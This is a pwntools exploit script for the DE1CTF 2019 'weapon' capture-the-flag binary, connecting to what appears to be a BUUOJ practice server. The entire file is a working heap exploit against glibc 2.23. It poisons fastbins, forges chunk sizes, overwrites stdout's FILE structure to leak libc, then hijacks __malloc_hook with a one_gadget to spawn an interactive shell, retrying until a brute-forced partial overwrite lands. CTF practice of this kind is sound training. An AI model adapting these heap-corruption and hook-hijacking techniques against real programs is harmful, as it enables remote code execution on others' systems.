from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('de1ctf_2019_weapon')
io = remote('node4.buuoj.cn', 29974)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
elf = ELF('de1ctf_2019_weapon')


def add(size, index, name):
    io.sendlineafter('choice >> ', '1')
    io.sendlineafter('wlecome input your size of weapon: ', str(size))
    io.sendlineafter('input index: ', str(index))
    io.sendafter('input your name:', name)


def delete(index):
    io.sendlineafter('choice >> ', '2')
    io.sendlineafter('input idx :', str(index))


def edit(index, name):
    io.sendlineafter('choice >> ', '3')
    io.sendlineafter('input idx: ', str(index))
    io.sendafter('new content:', name)


def leak_libc():
    global libc_base
    add(0x18, 0, p64(0) + p64(0x71))            # chunk0 0x20
    add(0x60, 1, 'b')                           # chunk1 0x70
    add(0x60, 2, 'c')                           # chunk2 0x70
    add(0x60, 3, 'd')                           # chunk3 0x70
    add(0x60, 4, 'e')                           # chunk4 0x70
    delete(2)                                   # fastbins(0x70)->chunk2
    delete(1)                                   # fastbins(0x70)->chunk1->chunk2
    edit(1, p8(0x10))                           # fastbins(0x70)->chunk1->fake_chunk
    add(0x60, 1, 'b')                           # chunk1 0x70
    add(0x60, 2, 'c')                           # fake_chunk 0x70
    delete(1)                                   # put chunk1 into fastbin(0x50)
    edit(2, p64(0) + p64(0xe1))                 # change chunk1->size to 0xe1
    delete(1)                                   # put fake_chunk1 into unsorted_bin
    edit(2, p64(0) + p64(0x71) + p16(0x95dd))   # change chunk1->size back to 0x71 and chunk1->fd to _IO_2_1_stderr_+157
    add(0x60, 1, 'b')                           # chunk1 0x70
    payload = b'\x00' * 0x33 + p64(0xfbad1800) + p64(0) * 3 + p8(0x88)
    add(0x60, 5, payload)                       # overwrite stdout to leak
    libc_base = u64(io.recvuntil('\x7f\x00\x00')[-8:]) - libc.sym['_IO_2_1_stdin_']
    log.success('libc_base: ' + hex(libc_base))


def pwn():
    __malloc_hook = libc_base + libc.sym['__malloc_hook']
    realloc = libc_base + libc.sym['realloc']
    # one_gadget = libc_base + 0xf1247
    one_gadget = libc_base + 0xf1147
    delete(4)
    delete(3)
    edit(3, p64(__malloc_hook - 0x23))
    add(0x60, 3, 'd')                           # chunk3 0x70
    payload = b'a' * 0xb + p64(one_gadget) + p64(realloc + 2)
    add(0x60, 4, payload)                       # fake_chunk4 0x70
    # gdb.attach(io)
    # pause()

    io.sendlineafter('choice >> ', '1')
    io.sendlineafter('wlecome input your size of weapon: ', '1')
    io.sendlineafter('input index: ', '1')
    io.interactive()

if __name__ == '__main__':
    while True:
        try:
            io.close()
            # io = process('de1ctf_2019_weapon')
            io = remote('node4.buuoj.cn', 29974)
            leak_libc()
        except EOFError:
            continue
        else:
            break
    pwn()
